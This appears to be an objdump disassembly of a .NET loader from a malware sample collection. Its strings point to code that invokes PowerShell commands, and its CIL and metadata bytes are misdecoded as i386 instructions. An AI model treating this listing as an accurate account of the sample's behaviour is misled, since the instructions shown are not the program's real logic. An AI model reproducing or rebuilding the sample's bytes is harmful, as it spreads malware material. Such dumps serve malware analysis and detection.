
malware_samples/loader/95ee4b9f039d8491f6c3b537a57a8a16349bdf63cb1d0d69e291b0fde580e4cd.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	b8 2a 00 00 00       	mov    $0x2a,%eax
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f8 20 00       	add    $0x20f800,%eax
  402013:	00 54 08 00          	add    %dl,0x0(%eax,%ecx,1)
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 02                	add    %al,(%edx)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	01 00                	add    %eax,(%eax)
  402054:	12 00                	adc    (%eax),%al
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	72 01                	jb     0x40205f
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 0a                	jo     0x40206c
  402062:	06                   	push   %es
  402063:	28 02                	sub    %al,(%edx)
  402065:	00 00                	add    %al,(%eax)
  402067:	06                   	push   %es
  402068:	de 03                	fiadds (%ebx)
  40206a:	26 de 00             	fiadds %es:(%eax)
  40206d:	2a 00                	sub    (%eax),%al
  40206f:	00 01                	add    %al,(%ecx)
  402071:	10 00                	adc    %al,(%eax)
  402073:	00 00                	add    %al,(%eax)
  402075:	00 06                	add    %al,(%esi)
  402077:	00 08                	add    %cl,(%eax)
  402079:	0e                   	push   %cs
  40207a:	00 03                	add    %al,(%ebx)
  40207c:	11 00                	adc    %eax,(%eax)
  40207e:	00 01                	add    %al,(%ecx)
  402080:	1b 30                	sbb    (%eax),%esi
  402082:	03 00                	add    (%eax),%eax
  402084:	54                   	push   %esp
  402085:	00 00                	add    %al,(%eax)
  402087:	00 02                	add    %al,(%edx)
  402089:	00 00                	add    %al,(%eax)
  40208b:	11 28                	adc    %ebp,(%eax)
  40208d:	0f 00 00             	sldt   (%eax)
  402090:	0a 0a                	or     (%edx),%cl
  402092:	06                   	push   %es
  402093:	72 09                	jb     0x40209e
  402095:	00 00                	add    %al,(%eax)
  402097:	70 6f                	jo     0x402108
  402099:	10 00                	adc    %al,(%eax)
  40209b:	00 0a                	add    %cl,(%edx)
  40209d:	72 2b                	jb     0x4020ca
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	70 02                	jo     0x4020a5
  4020a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4020a4:	11 00                	adc    %eax,(%eax)
  4020a6:	00 0a                	add    %cl,(%edx)
  4020a8:	26 06                	es push %es
  4020aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ab:	12 00                	adc    (%eax),%al
  4020ad:	00 0a                	add    %cl,(%edx)
  4020af:	26 06                	es push %es
  4020b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4020b2:	13 00                	adc    (%eax),%eax
  4020b4:	00 0a                	add    %cl,(%edx)
  4020b6:	2c 1b                	sub    $0x1b,%al
  4020b8:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4020bb:	00 0a                	add    %cl,(%edx)
  4020bd:	06                   	push   %es
  4020be:	6f                   	outsl  %ds:(%esi),(%dx)
  4020bf:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4020c4:	16                   	push   %ss
  4020c5:	00 00                	add    %al,(%eax)
  4020c7:	0a 28                	or     (%eax),%ch
  4020c9:	01 00                	add    %eax,(%eax)
  4020cb:	00 2b                	add    %ch,(%ebx)
  4020cd:	73 18                	jae    0x4020e7
  4020cf:	00 00                	add    %al,(%eax)
  4020d1:	0a 7a de             	or     -0x22(%edx),%bh
  4020d4:	0a 06                	or     (%esi),%al
  4020d6:	2c 06                	sub    $0x6,%al
  4020d8:	06                   	push   %es
  4020d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020da:	19 00                	sbb    %eax,(%eax)
  4020dc:	00 0a                	add    %cl,(%edx)
  4020de:	dc 2a                	fsubrl (%edx)
  4020e0:	01 10                	add    %edx,(%eax)
  4020e2:	00 00                	add    %al,(%eax)
  4020e4:	02 00                	add    (%eax),%al
  4020e6:	06                   	push   %es
  4020e7:	00 43 49             	add    %al,0x49(%ebx)
  4020ea:	00 0a                	add    %cl,(%edx)
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	1e                   	push   %ds
  4020f1:	02 28                	add    (%eax),%ch
  4020f3:	1a 00                	sbb    (%eax),%al
  4020f5:	00 0a                	add    %cl,(%edx)
  4020f7:	2a 42 53             	sub    0x53(%edx),%al
  4020fa:	4a                   	dec    %edx
  4020fb:	42                   	inc    %edx
  4020fc:	01 00                	add    %eax,(%eax)
  4020fe:	01 00                	add    %eax,(%eax)
  402100:	00 00                	add    %al,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	0c 00                	or     $0x0,%al
  402106:	00 00                	add    %al,(%eax)
  402108:	76 34                	jbe    0x40213e
  40210a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40210d:	33 30                	xor    (%eax),%esi
  40210f:	33 31                	xor    (%ecx),%esi
  402111:	39 00                	cmp    %eax,(%eax)
  402113:	00 00                	add    %al,(%eax)
  402115:	00 05 00 6c 00 00    	add    %al,0x6c00
  40211b:	00 7c 02 00          	add    %bh,0x0(%edx,%eax,1)
  40211f:	00 23                	add    %ah,(%ebx)
  402121:	7e 00                	jle    0x402123
  402123:	00 e8                	add    %ch,%al
  402125:	02 00                	add    (%eax),%al
  402127:	00 a4 03 00 00 23 53 	add    %ah,0x53230000(%ebx,%eax,1)
  40212e:	74 72                	je     0x4021a2
  402130:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  402137:	00 8c 06 00 00 48 00 	add    %cl,0x480000(%esi,%eax,1)
  40213e:	00 00                	add    %al,(%eax)
  402140:	23 55 53             	and    0x53(%ebp),%edx
  402143:	00 d4                	add    %dl,%ah
  402145:	06                   	push   %es
  402146:	00 00                	add    %al,(%eax)
  402148:	10 00                	adc    %al,(%eax)
  40214a:	00 00                	add    %al,(%eax)
  40214c:	23 47 55             	and    0x55(%edi),%eax
  40214f:	49                   	dec    %ecx
  402150:	44                   	inc    %esp
  402151:	00 00                	add    %al,(%eax)
  402153:	00 e4                	add    %ah,%ah
  402155:	06                   	push   %es
  402156:	00 00                	add    %al,(%eax)
  402158:	70 01                	jo     0x40215b
  40215a:	00 00                	add    %al,(%eax)
  40215c:	23 42 6c             	and    0x6c(%edx),%eax
  40215f:	6f                   	outsl  %ds:(%esi),(%dx)
  402160:	62 00                	bound  %eax,(%eax)
  402162:	00 00                	add    %al,(%eax)
  402164:	00 00                	add    %al,(%eax)
  402166:	00 00                	add    %al,(%eax)
  402168:	02 00                	add    (%eax),%al
  40216a:	00 01                	add    %al,(%ecx)
  40216c:	47                   	inc    %edi
  40216d:	15 02 00 09 08       	adc    $0x8090002,%eax
  402172:	00 00                	add    %al,(%eax)
  402174:	00 fa                	add    %bh,%dl
  402176:	01 33                	add    %esi,(%ebx)
  402178:	00 16                	add    %dl,(%esi)
  40217a:	00 00                	add    %al,(%eax)
  40217c:	01 00                	add    %eax,(%eax)
  40217e:	00 00                	add    %al,(%eax)
  402180:	1b 00                	sbb    (%eax),%eax
  402182:	00 00                	add    %al,(%eax)
  402184:	02 00                	add    (%eax),%al
  402186:	00 00                	add    %al,(%eax)
  402188:	03 00                	add    (%eax),%eax
  40218a:	00 00                	add    %al,(%eax)
  40218c:	02 00                	add    (%eax),%al
  40218e:	00 00                	add    %al,(%eax)
  402190:	1a 00                	sbb    (%eax),%al
  402192:	00 00                	add    %al,(%eax)
  402194:	0e                   	push   %cs
  402195:	00 00                	add    %al,(%eax)
  402197:	00 02                	add    %al,(%edx)
  402199:	00 00                	add    %al,(%eax)
  40219b:	00 01                	add    %al,(%ecx)
  40219d:	00 00                	add    %al,(%eax)
  40219f:	00 02                	add    %al,(%edx)
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	00 01                	add    %al,(%ecx)
  4021a5:	00 00                	add    %al,(%eax)
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	00 0d 02 01 00 00    	add    %cl,0x102
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	00 06                	add    %al,(%esi)
  4021b3:	00 82 01 32 03 06    	add    %al,0x6033201(%edx)
  4021b9:	00 ef                	add    %ch,%bh
  4021bb:	01 32                	add    %esi,(%edx)
  4021bd:	03 06                	add    (%esi),%eax
  4021bf:	00 b6 00 00 03 0f    	add    %dh,0xf030000(%esi)
  4021c5:	00 52 03             	add    %dl,0x3(%edx)
  4021c8:	00 00                	add    %al,(%eax)
  4021ca:	06                   	push   %es
  4021cb:	00 de                	add    %bl,%dh
  4021cd:	00 c7                	add    %al,%bh
  4021cf:	02 06                	add    (%esi),%al
  4021d1:	00 65 01             	add    %ah,0x1(%ebp)
  4021d4:	c7 02 06 00 46 01    	movl   $0x1460006,(%edx)
  4021da:	c7 02 06 00 d6 01    	movl   $0x1d60006,(%edx)
  4021e0:	c7 02 06 00 a2 01    	movl   $0x1a20006,(%edx)
  4021e6:	c7 02 06 00 bb 01    	movl   $0x1bb0006,(%edx)
  4021ec:	c7 02 06 00 f5 00    	movl   $0xf50006,(%edx)
  4021f2:	c7 02 06 00 ca 00    	movl   $0xca0006,(%edx)
  4021f8:	13 03                	adc    (%ebx),%eax
  4021fa:	06                   	push   %es
  4021fb:	00 a8 00 13 03 06    	add    %ch,0x6031300(%eax)
  402201:	00 29                	add    %ch,(%ecx)
  402203:	01 c7                	add    %eax,%edi
  402205:	02 06                	add    (%esi),%al
  402207:	00 10                	add    %dl,(%eax)
  402209:	01 25 02 06 00 90    	add    %esp,0x90000602
  40220f:	03 7d 02             	add    0x2(%ebp),%edi
  402212:	06                   	push   %es
  402213:	00 d9                	add    %bl,%cl
  402215:	02 7d 02             	add    0x2(%ebp),%bh
  402218:	0a 00                	or     (%eax),%al
  40221a:	6a 02                	push   $0x2
  40221c:	aa                   	stos   %al,%es:(%edi)
  40221d:	02 06                	add    (%esi),%al
  40221f:	00 15 00 4b 02 0a    	add    %dl,0xa024b00
  402225:	00 8e 03 aa 02 06    	add    %cl,0x602aa03(%esi)
  40222b:	00 97 03 7d 02 0a    	add    %dl,0xa027d03(%edi)
  402231:	00 72 03             	add    %dh,0x3(%edx)
  402234:	aa                   	stos   %al,%es:(%edi)
  402235:	02 0a                	add    (%edx),%cl
  402237:	00 0f                	add    %cl,(%edi)
  402239:	00 aa 02 0a 00 6e    	add    %ch,0x6e000a02(%edx)
  40223f:	00 aa 02 06 00 3f    	add    %ch,0x3f000602(%edx)
  402245:	02 7d 02             	add    0x2(%ebp),%bh
  402248:	06                   	push   %es
  402249:	00 01                	add    %al,(%ecx)
  40224b:	00 48 00             	add    %cl,0x0(%eax)
  40224e:	06                   	push   %es
  40224f:	00 81 00 7d 02 00    	add    %al,0x27d00(%ecx)
  402255:	00 00                	add    %al,(%eax)
  402257:	00 36                	add    %dh,(%esi)
  402259:	00 00                	add    %al,(%eax)
  40225b:	00 00                	add    %al,(%eax)
  40225d:	00 01                	add    %al,(%ecx)
  40225f:	00 01                	add    %al,(%ecx)
  402261:	00 00                	add    %al,(%eax)
  402263:	00 10                	add    %dl,(%eax)
  402265:	00 75 02             	add    %dh,0x2(%ebp)
  402268:	22 00                	and    (%eax),%al
  40226a:	41                   	inc    %ecx
  40226b:	00 01                	add    %al,(%ecx)
  40226d:	00 01                	add    %al,(%ecx)
  40226f:	00 50 20             	add    %dl,0x20(%eax)
  402272:	00 00                	add    %al,(%eax)
  402274:	00 00                	add    %al,(%eax)
  402276:	91                   	xchg   %eax,%ecx
  402277:	00 84 02 77 00 01 00 	add    %al,0x10077(%edx,%eax,1)
  40227e:	80 20 00             	andb   $0x0,(%eax)
  402281:	00 00                	add    %al,(%eax)
  402283:	00 91 00 8e 02 7d    	add    %dl,0x7d028e00(%ecx)
  402289:	00 02                	add    %al,(%edx)
  40228b:	00 f0                	add    %dh,%al
  40228d:	20 00                	and    %al,(%eax)
  40228f:	00 00                	add    %al,(%eax)
  402291:	00 86 18 fa 02 06    	add    %al,0x602fa18(%esi)
  402297:	00 03                	add    %al,(%ebx)
  402299:	00 00                	add    %al,(%eax)
  40229b:	00 01                	add    %al,(%ecx)
  40229d:	00 61 03             	add    %ah,0x3(%ecx)
  4022a0:	00 00                	add    %al,(%eax)
  4022a2:	01 00                	add    %eax,(%eax)
  4022a4:	46                   	inc    %esi
  4022a5:	02 09                	add    (%ecx),%cl
  4022a7:	00 fa                	add    %bh,%dl
  4022a9:	02 01                	add    (%ecx),%al
  4022ab:	00 11                	add    %dl,(%ecx)
  4022ad:	00 fa                	add    %bh,%dl
  4022af:	02 06                	add    (%esi),%al
  4022b1:	00 19                	add    %bl,(%ecx)
  4022b3:	00 fa                	add    %bh,%dl
  4022b5:	02 0a                	add    (%edx),%cl
  4022b7:	00 29                	add    %ch,(%ecx)
  4022b9:	00 fa                	add    %bh,%dl
  4022bb:	02 10                	add    (%eax),%dl
  4022bd:	00 31                	add    %dh,(%ecx)
  4022bf:	00 fa                	add    %bh,%dl
  4022c1:	02 10                	add    (%eax),%dl
  4022c3:	00 39                	add    %bh,(%ecx)
  4022c5:	00 fa                	add    %bh,%dl
  4022c7:	02 10                	add    (%eax),%dl
  4022c9:	00 41 00             	add    %al,0x0(%ecx)
  4022cc:	fa                   	cli
  4022cd:	02 10                	add    (%eax),%dl
  4022cf:	00 49 00             	add    %cl,0x0(%ecx)
  4022d2:	fa                   	cli
  4022d3:	02 10                	add    (%eax),%dl
  4022d5:	00 51 00             	add    %dl,0x0(%ecx)
  4022d8:	fa                   	cli
  4022d9:	02 10                	add    (%eax),%dl
  4022db:	00 59 00             	add    %bl,0x0(%ecx)
  4022de:	fa                   	cli
  4022df:	02 10                	add    (%eax),%dl
  4022e1:	00 61 00             	add    %ah,0x0(%ecx)
  4022e4:	fa                   	cli
  4022e5:	02 15 00 69 00 fa    	add    0xfa006900,%dl
  4022eb:	02 10                	add    (%eax),%dl
  4022ed:	00 71 00             	add    %dh,0x0(%ecx)
  4022f0:	fa                   	cli
  4022f1:	02 10                	add    (%eax),%dl
  4022f3:	00 79 00             	add    %bh,0x0(%ecx)
  4022f6:	fa                   	cli
  4022f7:	02 10                	add    (%eax),%dl
  4022f9:	00 91 00 a1 00 23    	add    %dl,0x2300a100(%ecx)
  4022ff:	00 91 00 63 00 28    	add    %dl,0x28006300(%ecx)
  402305:	00 91 00 e3 02 2e    	add    %dl,0x2e02e300(%ecx)
  40230b:	00 91 00 7a 00 35    	add    %dl,0x35007a00(%ecx)
  402311:	00 91 00 80 03 3e    	add    %dl,0x3e038000(%ecx)
  402317:	00 a9 00 8d 00 42    	add    %ch,0x42008d00(%ecx)
  40231d:	00 91 00 66 03 46    	add    %dl,0x46036600(%ecx)
  402323:	00 b1 00 f0 02 4b    	add    %dh,0x4b02f000(%ecx)
  402329:	00 c9                	add    %cl,%cl
  40232b:	00 89 02 54 00 89    	add    %cl,-0x76ffabfe(%ecx)
  402331:	00 fa                	add    %bh,%dl
  402333:	02 10                	add    (%eax),%dl
  402335:	00 d9                	add    %bl,%cl
  402337:	00 99 00 06 00 81    	add    %bl,-0x7efffa00(%ecx)
  40233d:	00 fa                	add    %bh,%dl
  40233f:	02 06                	add    (%esi),%al
  402341:	00 2e                	add    %ch,(%esi)
  402343:	00 0b                	add    %cl,(%ebx)
  402345:	00 82 00 2e 00 13    	add    %al,0x13002e00(%edx)
  40234b:	00 8b 00 2e 00 1b    	add    %cl,0x1b002e00(%ebx)
  402351:	00 aa 00 2e 00 23    	add    %ch,0x23002e00(%edx)
  402357:	00 b3 00 2e 00 2b    	add    %dh,0x2b002e00(%ebx)
  40235d:	00 cc                	add    %cl,%ah
  40235f:	00 2e                	add    %ch,(%esi)
  402361:	00 33                	add    %dh,(%ebx)
  402363:	00 cc                	add    %cl,%ah
  402365:	00 2e                	add    %ch,(%esi)
  402367:	00 3b                	add    %bh,(%ebx)
  402369:	00 cc                	add    %cl,%ah
  40236b:	00 2e                	add    %ch,(%esi)
  40236d:	00 43 00             	add    %al,0x0(%ebx)
  402370:	b3 00                	mov    $0x0,%bl
  402372:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  402376:	d2 00                	rolb   %cl,(%eax)
  402378:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40237c:	cc                   	int3
  40237d:	00 2e                	add    %ch,(%esi)
  40237f:	00 5b 00             	add    %bl,0x0(%ebx)
  402382:	cc                   	int3
  402383:	00 2e                	add    %ch,(%esi)
  402385:	00 63 00             	add    %ah,0x0(%ebx)
  402388:	ea 00 2e 00 6b 00 14 	ljmp   $0x1400,$0x6b002e00
  40238f:	01 2e                	add    %ebp,(%esi)
  402391:	00 73 00             	add    %dh,0x0(%ebx)
  402394:	21 01                	and    %eax,(%ecx)
  402396:	1a 00                	sbb    (%eax),%al
  402398:	1e                   	push   %ds
  402399:	00 04 80             	add    %al,(%eax,%eax,4)
  40239c:	00 00                	add    %al,(%eax)
  40239e:	01 00                	add    %eax,(%eax)
	...
  4023ac:	22 00                	and    (%eax),%al
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	04 00                	add    $0x0,%al
	...
  4023ba:	00 00                	add    %al,(%eax)
  4023bc:	65 00 3f             	add    %bh,%gs:(%edi)
  4023bf:	00 00                	add    %al,(%eax)
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	00 03                	add    %al,(%ebx)
	...
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	00 6e 00             	add    %ch,0x0(%esi)
  4023d2:	aa                   	stos   %al,%es:(%edi)
  4023d3:	02 00                	add    (%eax),%al
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	00 2f                	add    %ch,(%edi)
  4023d9:	00 60 00             	add    %ah,0x0(%eax)
  4023dc:	00 00                	add    %al,(%eax)
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	00 49 45             	add    %cl,0x45(%ecx)
  4023e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4023e4:	75 6d                	jne    0x402453
  4023e6:	65 72 61             	gs jb  0x40244a
  4023e9:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4023ed:	31 00                	xor    %eax,(%eax)
  4023ef:	50                   	push   %eax
  4023f0:	53                   	push   %ebx
  4023f1:	44                   	inc    %esp
  4023f2:	61                   	popa
  4023f3:	74 61                	je     0x402456
  4023f5:	43                   	inc    %ebx
  4023f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f7:	6c                   	insb   (%dx),%es:(%edi)
  4023f8:	6c                   	insb   (%dx),%es:(%edi)
  4023f9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4023fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4023ff:	60                   	pusha
  402400:	31 00                	xor    %eax,(%eax)
  402402:	43                   	inc    %ebx
  402403:	6f                   	outsl  %ds:(%esi),(%dx)
  402404:	6e                   	outsb  %ds:(%esi),(%dx)
  402405:	73 6f                	jae    0x402476
  402407:	6c                   	insb   (%dx),%es:(%edi)
  402408:	65 41                	gs inc %ecx
  40240a:	70 70                	jo     0x40247c
  40240c:	6c                   	insb   (%dx),%es:(%edi)
  40240d:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402414:	32 00                	xor    (%eax),%al
  402416:	3c 4d                	cmp    $0x4d,%al
  402418:	6f                   	outsl  %ds:(%esi),(%dx)
  402419:	64 75 6c             	fs jne 0x402488
  40241c:	65 3e 00 6d 73       	gs add %ch,%ds:0x73(%ebp)
  402421:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402424:	6c                   	insb   (%dx),%es:(%edi)
  402425:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  40242c:	65 6d                	gs insl (%dx),%es:(%edi)
  40242e:	2e 43                	cs inc %ebx
  402430:	6f                   	outsl  %ds:(%esi),(%dx)
  402431:	6c                   	insb   (%dx),%es:(%edi)
  402432:	6c                   	insb   (%dx),%es:(%edi)
  402433:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402438:	6e                   	outsb  %ds:(%esi),(%dx)
  402439:	73 2e                	jae    0x402469
  40243b:	47                   	inc    %edi
  40243c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40243e:	65 72 69             	gs jb  0x4024aa
  402441:	63 00                	arpl   %eax,(%eax)
  402443:	41                   	inc    %ecx
  402444:	64 64 43             	fs fs inc %ebx
  402447:	6f                   	outsl  %ds:(%esi),(%dx)
  402448:	6d                   	insl   (%dx),%es:(%edi)
  402449:	6d                   	insl   (%dx),%es:(%edi)
  40244a:	61                   	popa
  40244b:	6e                   	outsb  %ds:(%esi),(%dx)
  40244c:	64 00 45 72          	add    %al,%fs:0x72(%ebp)
  402450:	72 6f                	jb     0x4024c1
  402452:	72 52                	jb     0x4024a6
  402454:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  402458:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  40245c:	76 6f                	jbe    0x4024cd
  40245e:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  402462:	44                   	inc    %esp
  402463:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40246a:	6c                   	insb   (%dx),%es:(%edi)
  40246b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40246f:	74 5f                	je     0x4024d0
  402471:	4e                   	dec    %esi
  402472:	65 77 4c             	gs ja  0x4024c1
  402475:	69 6e 65 00 44 69 73 	imul   $0x73694400,0x65(%esi),%ebp
  40247c:	70 6f                	jo     0x4024ed
  40247e:	73 65                	jae    0x4024e5
  402480:	00 43 72             	add    %al,0x72(%ebx)
  402483:	65 61                	gs popa
  402485:	74 65                	je     0x4024ec
  402487:	00 47 75             	add    %al,0x75(%edi)
  40248a:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402491:	62 
  402492:	75 74                	jne    0x402508
  402494:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402499:	75 67                	jne    0x402502
  40249b:	67 61                	addr16 popa
  40249d:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4024a1:	74 74                	je     0x402517
  4024a3:	72 69                	jb     0x40250e
  4024a5:	62 75 74             	bound  %esi,0x74(%ebp)
  4024a8:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4024ac:	6d                   	insl   (%dx),%es:(%edi)
  4024ad:	56                   	push   %esi
  4024ae:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4024b5:	74 74                	je     0x40252b
  4024b7:	72 69                	jb     0x402522
  4024b9:	62 75 74             	bound  %esi,0x74(%ebp)
  4024bc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024c0:	73 65                	jae    0x402527
  4024c2:	6d                   	insl   (%dx),%es:(%edi)
  4024c3:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4024c7:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4024ce:	72 
  4024cf:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4024d6:	73 73                	jae    0x40254b
  4024d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4024da:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4024de:	72 61                	jb     0x402541
  4024e0:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4024e3:	61                   	popa
  4024e4:	72 6b                	jb     0x402551
  4024e6:	41                   	inc    %ecx
  4024e7:	74 74                	je     0x40255d
  4024e9:	72 69                	jb     0x402554
  4024eb:	62 75 74             	bound  %esi,0x74(%ebp)
  4024ee:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4024f3:	67 65 74 46          	addr16 gs je 0x40253d
  4024f7:	72 61                	jb     0x40255a
  4024f9:	6d                   	insl   (%dx),%es:(%edi)
  4024fa:	65 77 6f             	gs ja  0x40256c
  4024fd:	72 6b                	jb     0x40256a
  4024ff:	41                   	inc    %ecx
  402500:	74 74                	je     0x402576
  402502:	72 69                	jb     0x40256d
  402504:	62 75 74             	bound  %esi,0x74(%ebp)
  402507:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40250b:	73 65                	jae    0x402572
  40250d:	6d                   	insl   (%dx),%es:(%edi)
  40250e:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402512:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402519:	69 
  40251a:	6f                   	outsl  %ds:(%esi),(%dx)
  40251b:	6e                   	outsb  %ds:(%esi),(%dx)
  40251c:	41                   	inc    %ecx
  40251d:	74 74                	je     0x402593
  40251f:	72 69                	jb     0x40258a
  402521:	62 75 74             	bound  %esi,0x74(%ebp)
  402524:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402528:	73 65                	jae    0x40258f
  40252a:	6d                   	insl   (%dx),%es:(%edi)
  40252b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40252f:	6f                   	outsl  %ds:(%esi),(%dx)
  402530:	6e                   	outsb  %ds:(%esi),(%dx)
  402531:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402537:	74 69                	je     0x4025a2
  402539:	6f                   	outsl  %ds:(%esi),(%dx)
  40253a:	6e                   	outsb  %ds:(%esi),(%dx)
  40253b:	41                   	inc    %ecx
  40253c:	74 74                	je     0x4025b2
  40253e:	72 69                	jb     0x4025a9
  402540:	62 75 74             	bound  %esi,0x74(%ebp)
  402543:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402547:	73 65                	jae    0x4025ae
  402549:	6d                   	insl   (%dx),%es:(%edi)
  40254a:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40254e:	65 73 63             	gs jae 0x4025b4
  402551:	72 69                	jb     0x4025bc
  402553:	70 74                	jo     0x4025c9
  402555:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40255c:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  402563:	6f                   	outsl  %ds:(%esi),(%dx)
  402564:	6d                   	insl   (%dx),%es:(%edi)
  402565:	70 69                	jo     0x4025d0
  402567:	6c                   	insb   (%dx),%es:(%edi)
  402568:	61                   	popa
  402569:	74 69                	je     0x4025d4
  40256b:	6f                   	outsl  %ds:(%esi),(%dx)
  40256c:	6e                   	outsb  %ds:(%esi),(%dx)
  40256d:	52                   	push   %edx
  40256e:	65 6c                	gs insb (%dx),%es:(%edi)
  402570:	61                   	popa
  402571:	78 61                	js     0x4025d4
  402573:	74 69                	je     0x4025de
  402575:	6f                   	outsl  %ds:(%esi),(%dx)
  402576:	6e                   	outsb  %ds:(%esi),(%dx)
  402577:	73 41                	jae    0x4025ba
  402579:	74 74                	je     0x4025ef
  40257b:	72 69                	jb     0x4025e6
  40257d:	62 75 74             	bound  %esi,0x74(%ebp)
  402580:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402584:	73 65                	jae    0x4025eb
  402586:	6d                   	insl   (%dx),%es:(%edi)
  402587:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40258b:	72 6f                	jb     0x4025fc
  40258d:	64 75 63             	fs jne 0x4025f3
  402590:	74 41                	je     0x4025d3
  402592:	74 74                	je     0x402608
  402594:	72 69                	jb     0x4025ff
  402596:	62 75 74             	bound  %esi,0x74(%ebp)
  402599:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40259d:	73 65                	jae    0x402604
  40259f:	6d                   	insl   (%dx),%es:(%edi)
  4025a0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4025a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4025a5:	70 79                	jo     0x402620
  4025a7:	72 69                	jb     0x402612
  4025a9:	67 68 74 41 74 74    	addr16 push $0x74744174
  4025af:	72 69                	jb     0x40261a
  4025b1:	62 75 74             	bound  %esi,0x74(%ebp)
  4025b4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4025b8:	73 65                	jae    0x40261f
  4025ba:	6d                   	insl   (%dx),%es:(%edi)
  4025bb:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4025bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c0:	6d                   	insl   (%dx),%es:(%edi)
  4025c1:	70 61                	jo     0x402624
  4025c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4025c4:	79 41                	jns    0x402607
  4025c6:	74 74                	je     0x40263c
  4025c8:	72 69                	jb     0x402633
  4025ca:	62 75 74             	bound  %esi,0x74(%ebp)
  4025cd:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4025d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4025d2:	74 69                	je     0x40263d
  4025d4:	6d                   	insl   (%dx),%es:(%edi)
  4025d5:	65 43                	gs inc %ebx
  4025d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4025d8:	6d                   	insl   (%dx),%es:(%edi)
  4025d9:	70 61                	jo     0x40263c
  4025db:	74 69                	je     0x402646
  4025dd:	62 69 6c             	bound  %ebp,0x6c(%ecx)
